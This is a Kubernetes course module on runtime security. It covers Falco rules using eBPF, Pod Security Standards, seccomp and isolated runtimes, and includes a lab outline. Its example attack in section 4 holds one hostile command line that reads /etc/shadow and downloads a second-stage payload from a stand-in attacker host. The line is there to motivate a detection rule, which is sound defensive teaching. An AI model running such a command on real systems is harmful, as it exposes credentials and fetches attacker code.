# Module 13.7 — Runtime Security

> Every control in this phase so far stops a bad thing from *starting* — a policy rejects a
> pod, a signature gates an image, RBAC denies a call. But prevention fails eventually: a
> zero-day lands, an image is poisoned, a token is stolen. Runtime security assumes that moment
> has arrived and watches what your processes **actually do** — catching the breach in
> progress, not in the post-mortem.

**Estimated effort:** ~2 hours (theory + lab)
**You'll need:** [Module 02.5 · Container Security](../../02-containerization/05-container-security/)
for `securityContext` and seccomp, a working `kubectl` + [kind](https://kind.sigs.k8s.io/),
and [Helm](https://helm.sh/).

## Learning objectives

By the end of this module you will be able to:

- Explain why **detection and response** is necessary even when prevention works.
- Describe how **Falco** uses **eBPF** to watch kernel syscalls from a DaemonSet.
- Write a **Falco rule** — condition, output, priority, tags — using macros and lists.
- Contrast **Pod Security Standards** (prevention at admission) with runtime detection, and
  apply `restricted` namespace-wide.
- Triage a runtime alert, enrich it with Kubernetes context, and respond safely.

---

## 1. Concept

### Prevention is necessary but insufficient

Phase 13 has been about *prevention*: admission rejects a non-compliant pod (Module 13.3), a
signature gate blocks an unsigned image (Module 13.6), RBAC denies a bad call (Module 13.2).
Each decides, *before* a workload runs, whether it may exist — where most effort belongs,
because the cheapest breach never starts.

But every preventive control judges what a workload *is* — image, spec, permissions — at
admission time, and never what it *does* once running. A pod that passed every gate can still
be hit by a zero-day, pull a second-stage payload, or be driven by a stolen-but-valid
credential. **Assume breach** (Module 13.1) is the honest default. The only thing between a
foothold and an incident is then a layer *watching behaviour in real time* — **runtime
security**, layer 7 of defence in depth.

### Watch behaviour, not just configuration

Config-time controls answer *"is this allowed to run?"* Runtime controls answer *"is this
process doing something it never should?"* — behavioural signals an attacker must generate
however they got in:

```text
  Behaviour an attacker generates       Why it's suspicious
  ───────────────────────────────       ──────────────────────────────
  Shell spawned inside a container       apps don't exec /bin/sh themselves
  Unexpected outbound connection         C2 callback or data exfiltration
  Write to /etc, /bin, or a secret       tampering or persistence
  Package manager run in production      build tools in a prod container
  Mount of host FS or docker.sock        container-escape attempt
```

None are visible to an admission controller — they happen *after* the pod runs, so catching
them means watching its actual syscalls.

### Falco: syscalls, eBPF, and a rules engine

Enter **Falco**, the de-facto open-source runtime security engine (a CNCF graduated
project). It runs as a **DaemonSet** — one pod per node — and taps the **syscalls** every
container makes to the kernel (`execve`, `connect`, `open`). Syscalls are the narrow waist
every program passes through, so watching them catches behaviour in any language. Modern
Falco taps them with a small **eBPF** program — sandboxed, verified code in the kernel —
seeing every syscall with low overhead and no fragile kernel module, matching each against
**rules**. A match emits an **alert** to an **output**: stdout (used in the lab), a file, or
**Falcosidekick**, which fans alerts to Slack or a SIEM.

### Anatomy of a Falco rule

A Falco rule is YAML. Learn five fields and you can read or write any of them:

```yaml
- rule: Terminal shell in container          # unique name
  desc: A shell was spawned inside a container # human explanation
  condition: >                               # boolean trigger (syscall filter)
    spawned_process and container
    and proc.name in (shell_binaries)
  output: >                                  # message + context
    Shell in pod (ns=%k8s.ns.name pod=%k8s.pod.name cmd=%proc.cmdline)
  priority: WARNING                          # severity (emergency … debug)
  tags: [shell, mitre_execution]             # routing / filtering
```

Two features keep rules DRY: **macros** (named condition snippets — `spawned_process` and
`container` are built-ins) and **lists** (named value sets — `shell_binaries` is a built-in
`(ash, bash, dash, sh, zsh, …)`). Falco ships a large default ruleset; you *tune* it —
silence noise, raise priorities, add your own "never happen" rules.

### Pod Security Standards: prevention at admission

Runtime detection is layer 7, *paired* with a preventive control one layer down. **Pod
Security Standards (PSS)** are Kubernetes' built-in definition of three progressively stricter
workload profiles, enforced by the built-in **Pod Security Admission** controller (nothing to
install) via a namespace label like `pod-security.kubernetes.io/enforce: restricted`:

```text
  Privileged   no restrictions — host access and privileged containers allowed
  Baseline     blocks known-dangerous settings (hostNetwork, privileged, hostPath …)
  Restricted   hardened: non-root, drop ALL caps, seccomp RuntimeDefault, no escalation
```

A pod that violates `restricted` is **rejected at admission** — the non-root, drop-caps,
read-only, no-privilege-escalation, seccomp-`RuntimeDefault` hardening from Module 02.5, now
a *namespace-wide floor* no one can forget. PSS **prevents**; Falco **detects** what slips
past. Where PSS is too coarse (three fixed levels), **Kyverno** (Module 13.3) adds finer
custom rules — PSS as the floor, Kyverno for specifics.

### Seccomp, AppArmor, and stronger isolation

Two more kernel controls shrink what a running container *can* do. **Seccomp** filters the
syscalls a container may make; `seccompProfile: RuntimeDefault` blocks dozens of dangerous
ones and is the sensible floor (part of `restricted`). **AppArmor** (or SELinux) restricts
which files and capabilities a process may touch — for the filesystem what seccomp is for
syscalls.

When a workload is genuinely untrusted — multi-tenant SaaS, customer code — a hardened
container still shares one kernel with its neighbours, and a kernel exploit escapes it. Two
runtimes raise that wall via a **`runtimeClass`**: **gVisor** runs a user-space kernel that
intercepts syscalls before they reach the host; **Kata Containers** wraps each pod in a
lightweight VM with its own kernel. The trade-off is always **isolation versus overhead and
compatibility** — use them only where an escape's blast radius justifies the cost. Default
runtime + PSS + Falco suits most workloads.

---

## 2. Why it matters for platform engineering

- **Prevention has a ceiling; detection does not.** Harden admission forever and you still
  won't see a stolen credential used by a valid pod — runtime is the only layer that watches
  the attack *in progress*.
- **One DaemonSet secures every team.** Install Falco once, cluster-wide, and every workload
  gets runtime visibility for free — no team learns eBPF. Module 13.1's leverage, at layer 7.
- **Detection without response is theatre.** The platform owns the alert→action pipeline —
  enrich with Kubernetes context, route to the owning team, kill or quarantine when it counts.
- **Feedback into prevention.** Every real alert is a prevention gap — a shell-in-prod alert
  becomes a Kyverno policy or PSS tightening. Detection tells you *what to prevent next*.

---

## 3. Mental model

Hold one picture: **prevention and detection are two halves of a timeline, meeting the
moment a workload starts running.**

```text
   PREVENT (before run)             │   DETECT + RESPOND (while running)
  ──────────────────────────────────┼──────────────────────────────────────▶ time
   PSS · Kyverno · signing · RBAC    │   Falco watches syscalls  →  triage → respond
   reject if not ── pod admitted ───▶│   "DOING something wrong?" ─▶ feed back to PREVENT
```

Left of the line is this phase so far: decide, once, whether a workload may exist. Right of
it is this module: assume one got through and watch what it does. The loop back into a new
preventive control is the point — detection finds the next thing worth preventing. A platform
that only prevents is blind after admission; one that only detects drowns in alerts it could
have blocked. Run both, centrally.

---

## 4. Minimal implementation

Start with the gap. Take a pod that passed every preventive control — signed image,
`restricted` namespace, least-privilege RBAC — compliant by every admission-time measure. An
attacker then exploits a flaw in the app and opens a shell inside it:

```console
$ kubectl exec -it payments-7f9 -- /bin/sh
/ # cat /etc/shadow 2>/dev/null; wget http://evil.example/stage2 -O /tmp/x
```

Ask the preventive layers what they saw. Admission? Nothing — the pod was admitted minutes
ago and its *spec* never changed. PSS? Satisfied — still non-root, caps dropped. Signature?
Still valid. RBAC? `exec` hit the kube-apiserver, but the *process inside the container* is
invisible to it. **Every preventive control is blind to a shell opened in a running
container** — none watch behaviour. That is the detection gap.

The smallest fix is one rule whose condition matches the syscall this attack cannot avoid —
`spawned_process and container and proc.name in (shell_binaries)`, an `execve` of a shell
binary in a container (the full rule is `custom-falco-rule.yaml`, loaded in the lab). The
*same* `kubectl exec` then emits an alert on stdout:

```console
Warning Shell spawned in container (ns=prod pod=payments-7f9 cmd=/bin/sh user=app …)
```

No app change, no sidecar, nothing the attacker can see — one rule turned an invisible
foothold into a timestamped, attributable event. The lab installs Falco on kind, fires this
rule, then shows PSS rejecting the privileged pod prevention should stop first.

---

## 5. Hands-on lab

You'll install Falco as a DaemonSet on a local kind cluster with Helm, load a custom
"shell in a container" rule, exec a shell into a pod and watch the alert fire, then apply a
`restricted` Pod Security Standards namespace and watch admission reject a privileged pod —
detection and prevention side by side, free on local kind.

➡️ **[Start the lab](./lab/README.md)**

---

## 6. Production considerations

- **Tune before you deploy widely, or drown.** The default ruleset is noisy — CI runners exec
  shells, operators run package managers. Baseline normal, scope expected cases, page only on
  high-signal rules; alert fatigue is the top reason runtime detection is ignored.
- **Pick the driver deliberately.** Prefer the **modern eBPF** probe on recent kernels (5.8+)
  — no kernel headers, survives upgrades. Fall back to the legacy probe or kernel module only
  where you must.
- **Alerts need a pipeline, not a log line.** Route Falco through **Falcosidekick** to a SIEM
  or Slack, enriched with Kubernetes metadata so an alert reaches the owning team.
- **Define response runbooks up front.** Per high-severity rule, decide the action — notify,
  cordon the node, or quarantine the pod (unschedulable, snapshot for forensics). Automate the
  safe ones; keep a human for the rest.
- **Mind the overhead and the sensor.** eBPF is cheap but not free at high syscall rates.
  Falco is privileged, so lock down who can edit its rules and output.
- **Runtime has SLOs too.** Track detection coverage (MITRE ATT&CK techniques with a rule),
  mean time to detect, and false-positive rate; feed true positives back into prevention.

---

## 7. Common mistakes

- **Treating prevention as sufficient.** "We enforce PSS and sign images, so we don't need
  runtime." Every preventive control is blind to a compromised-but-valid workload. *Fix:* run
  detection as a non-negotiable layer 7.
- **Deploying the default ruleset untuned.** Full ruleset straight to paging, then ignored in
  the flood. *Fix:* baseline normal, scope expected cases, page only on high-signal rules.
- **Alerting with no response plan.** Alerts stream into a channel nobody owns. *Fix:* define
  per-rule runbooks and route by ownership *before* turning a rule on.
- **Confusing PSS with runtime detection.** Thinking a `restricted` namespace means you're
  "covered" at runtime. PSS prevents *at admission* and sees nothing once the pod runs. *Fix:*
  PSS as the floor, Falco for behaviour.
- **Never closing the loop.** Triaging the same alert weekly, never preventing its cause.
  *Fix:* turn each recurring true positive into a Kyverno/PSS rule.

---

## 8. Assessment

**Knowledge checks**

1. Why can an admission controller never detect a shell opened in a running pod? What *can*?
2. How does Falco observe container behaviour, and why does eBPF suit a platform DaemonSet?
3. Name the three Pod Security Standards levels and say what `restricted` requires.
4. Name the five core fields of a Falco rule and what each is for.
5. When would you choose a gVisor or Kata `runtimeClass`, and what do you trade for it?

**Concept exercise**

> Explain **runtime detection** to a colleague **without naming Falco, eBPF, or any
> product** — only the problem it solves and the behaviours it watches. Make the
> "prevention is not enough" argument land.

**Trade-off / debugging exercise**

> Your team enabled the full default ruleset; the channel now gets hundreds of alerts a day
> and engineers muted it, so a real cryptominer ran for a week unnoticed. Explain how "more
> detection" produced *less* security, how you'd retune so the miner pages while CI shells stay
> quiet, and how you'd stop the *class* of problem.

<details>
<summary>Discussion (open after you've answered)</summary>

- **Admission vs runtime:** admission checks a pod's *spec* once; a shell is a *behaviour* (an
  `execve` syscall) with no spec change, so only a runtime syscall watcher (Falco via eBPF,
  cheaply and with no kernel module) sees it.
- **PSS levels:** Privileged, Baseline, Restricted (non-root, drop ALL caps, seccomp
  RuntimeDefault, no escalation) — enforced by namespace labels at admission. A Falco rule's
  fields are `rule`, `desc`, `condition`, `output`, `priority`, `tags`.
- **gVisor/Kata:** for untrusted/multi-tenant workloads facing a kernel escape — trading
  performance for a user-space kernel (gVisor) or a per-pod VM (Kata).
- **Alert fatigue:** untuned volume buried the true positive. Scope the shell rule off CI
  namespaces, prioritise miner-like behaviour (unexpected outbound + spawned binary), page only
  on high-signal rules, and feed true positives back into prevention.

</details>

---

## 9. Further reading

- Falco — [Documentation and architecture](https://falco.org/docs/)
- Falco — [Rules reference and the default ruleset](https://falco.org/docs/reference/rules/)
- Kubernetes — [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- Kubernetes — [Restrict syscalls with seccomp](https://kubernetes.io/docs/tutorials/security/seccomp/)
  and [AppArmor](https://kubernetes.io/docs/tutorials/security/apparmor/)
- gVisor — [What is gVisor?](https://gvisor.dev/docs/)
- Kata Containers — [Documentation](https://katacontainers.io/)

---

### Module progress

- [ ] Theory completed
- [ ] Lab completed
- [ ] Architecture reviewed
- [ ] Assessment completed
- [ ] Production considerations documented

_Previous:_ [Module 13.6 — Image Signing and Verification](../06-image-signing-and-verification/)
· _Next:_ [Module 13.8 — Zero Trust for Platforms →](../08-zero-trust-for-platforms/)
